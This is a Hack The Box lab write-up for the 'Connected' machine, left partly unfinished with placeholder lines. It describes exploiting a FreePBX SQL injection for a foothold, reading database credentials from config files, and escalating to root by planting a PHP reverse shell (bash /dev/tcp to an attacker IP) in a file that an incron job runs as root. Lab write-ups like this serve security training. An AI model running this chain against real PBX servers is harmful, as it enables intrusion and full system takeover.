# Connected — Hack The Box Writeup

<img width="758" height="242" alt="image" src="https://github.com/user-attachments/assets/9d4baf22-e2fe-484e-9544-fdf51979691b" />

## Reconnaissance

### Port Scanning
```bash
nmap -sC -sV -oN nmap.txt 10.129.245.100
```

<img width="949" height="446" alt="image" src="https://github.com/user-attachments/assets/bf891c29-bef7-483e-8982-5866fe4357a9" />

### Web Enumeration
Port 80 serves a FreePBX / Sangoma administration portal. The login page requires credentials, and the footer reports the version:

```
FreePBX 16.0.40.7
```

This version is below the fixed releases (15.0.66 / 16.0.89 / 17.0.3) and is vulnerable to **CVE-2025-57819**.

---

## Initial Access

### CVE-2025-57819 — FreePBX `ajax.php` Unauthenticated SQLi to RCE

FreePBX prior to 15.0.66 / 16.0.89 / 17.0.3 exposes an unauthenticated SQL injection in the `/admin/ajax.php` endpoint. The injection can be leveraged into remote code execution because the FreePBX database user is permitted to schedule cronjobs.

**Exploit used:** [EDB 52681](https://www.exploit-db.com/exploits/52681)

**Steps:**

1. Fingerprint the version (FreePBX 16.0.40.7, confirmed vulnerable).
2. Run the public PoC against the target:
```bash
# ADD: the exact command / invocation you used from EDB 52681
python3 52681.py <args> 10.129.245.100
```
3. Received a shell as the **asterisk** user.

![foothold](ADD_FOOTHOLD_SCREENSHOT_HERE)

> **Note on Metasploit:** The module `exploit/unix/http/freepbx_unauth_sqli_to_rce` targets the same CVE but aborted with `payload-failed: Cronjob was not created.` The SQLi stage succeeded, but the module's RCE delivery — injecting a row into the `cronmanager` table and waiting for FreePBX's cron to execute it — did not match this build's cron behaviour (`16.0.40.7` runs jobs via `* * * * * fwconsole job --run`). The vulnerability is present; only the module's last-mile delivery was version-incompatible. The manual PoC succeeded where the module did not.

---

## Post-Exploitation Enumeration

As `asterisk`, standard escalation checks were run:

```bash
id
sudo -l                 # requires asterisk password (unknown) — dead end
sudo -n -l              # no NOPASSWD rules
find / -perm -4000 -type f 2>/dev/null   # only stock SUID binaries
getcap -r / 2>/dev/null                  # nothing
ps aux | grep mysqld                     # mysqld runs as 'mysql', not root
```

Only two real users exist on the system (`root` and `asterisk`), ruling out lateral movement.

### Database Credentials

An anonymous MySQL login was possible but had no privileges:
```sql
SELECT CURRENT_USER(), USER();   -- ''@localhost
SHOW GRANTS;                     -- GRANT USAGE ON *.* (no access)
```

The privileged DB credentials were recovered from the FreePBX config:
```bash
cat /etc/freepbx.conf
```
```php
$amp_conf["AMPDBUSER"] = "freepbxuser";
$amp_conf["AMPDBPASS"] = "mZzDpAGKTmPJ";
```

The FreePBX admin hash (raw SHA1) and other secrets were also dumped, but none were required for root:
```sql
SELECT * FROM ampusers;   -- admin : 05c689686a4fad5ce3ec76e7ae5708b1fe2da43a
```

---

## User Flag

```bash
cat /home/asterisk/user.txt
```
<img width="701" height="744" alt="image" src="https://github.com/user-attachments/assets/91465513-3d36-4c50-a380-5d9f502dd189" />

---

## Privilege Escalation

### Finding the incron Watcher

A sweep for writable files surfaced a non-standard, root-owned, writable file:

```bash
find / -writable -type f 2>/dev/null | grep -v '/proc\|/sys'
```
```
/usr/local/asterisk/ha_trigger      # empty, writable by asterisk
/usr/bin/freepbx_installer
```

Checking the **incron** tables revealed what watches that file:

```bash
cat /etc/incron.d/*
```
```
/usr/local/asterisk/ha_trigger   IN_CLOSE_WRITE   /usr/sbin/sysadmin_ha
```

`incrond` runs as **root** (confirmed with `ps aux | grep incrond`). When any process finishes writing to `ha_trigger`, root executes `/usr/sbin/sysadmin_ha`.

### Analysing `sysadmin_ha`

```bash
cat /usr/sbin/sysadmin_ha
```
```php
#!/usr/bin/php -q
<?php
if(file_exists("/var/www/html/admin/modules/freepbx_ha/license.php")) {
    include_once("/var/www/html/admin/modules/freepbx_ha/license.php");
}
$i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";
if (file_exists($i)) {
    require_once($i);
    $incron = new incron;
    $incron->rootTrigger();
}
```

The script runs as root and `include`s two PHP files from the web root. The `freepbx_ha` directory did not exist, but its parent is owned by `asterisk`:

```bash
ls -ld /var/www/html/admin/modules/
# drwxrwxr-x  asterisk asterisk  /var/www/html/admin/modules/
```

Since we own that directory, we can create `freepbx_ha/license.php`. `sysadmin_ha` includes it first and unconditionally, so any PHP placed there executes as root the moment the incron watch fires.

### Exploitation

**Proof of root execution:**
```bash
mkdir -p /var/www/html/admin/modules/freepbx_ha
echo '<?php file_put_contents("/tmp/proof", shell_exec("id")); ?>' \
  > /var/www/html/admin/modules/freepbx_ha/license.php
echo x > /usr/local/asterisk/ha_trigger   # writing content fires IN_CLOSE_WRITE
sleep 2
cat /tmp/proof        # uid=0(root)
```

**Reverse shell:**
```bash
# listener on attacker box
nc -lvnp 5555
```
```bash
cat > /var/www/html/admin/modules/freepbx_ha/license.php <<'EOF'
<?php system("bash -i >& /dev/tcp/10.10.14.196/5555 0>&1"); ?>
EOF
echo x > /usr/local/asterisk/ha_trigger
```

The incron watch fires, root runs `sysadmin_ha`, which includes our `license.php`, and a root shell lands on the listener.

### Root Shell

![root proof](ADD_ROOT_SCREENSHOT_HERE)

```bash
cat /root/root.txt
```
<img width="716" height="847" alt="image" src="https://github.com/user-attachments/assets/e065fe9a-2b95-48d7-a68e-84d90b71bba7" />

---

## Summary

| Step | Detail |
|------|--------|
| Foothold | CVE-2025-57819 — FreePBX `ajax.php` unauthenticated SQLi → RCE (EDB 52681) |
| Shell | `asterisk` user |
| Credentials | `freepbxuser:mZzDpAGKTmPJ` from `/etc/freepbx.conf` (not needed for root) |
| Privesc | incron watch on `/usr/local/asterisk/ha_trigger` → root runs `sysadmin_ha` (PHP) |
| Root | Writable PHP include (`freepbx_ha/license.php`) under asterisk-owned web root, executed as root |

---

## Notes / Lessons

- **"Vulnerable" ≠ "this exploit will land."** The Metasploit module and the manual PoC targeted the *same* CVE; the module failed only at its cron-based delivery step due to version drift, while the hand-run PoC worked. When an automated exploit aborts mid-chain, diagnose *which stage* failed rather than assuming the box is patched.
- **Privesc triage:** chase the highest-signal anomaly first — a non-standard, writable, root-owned file (`ha_trigger`) scored on all three axes (anomaly + writable + root-executed) and was the intended path. The DB/web-UI threads were distractions.
- `incron` is an easily-missed persistence/execution mechanism; always check `/etc/incron.d/` and `incrontab -l` during enumeration.
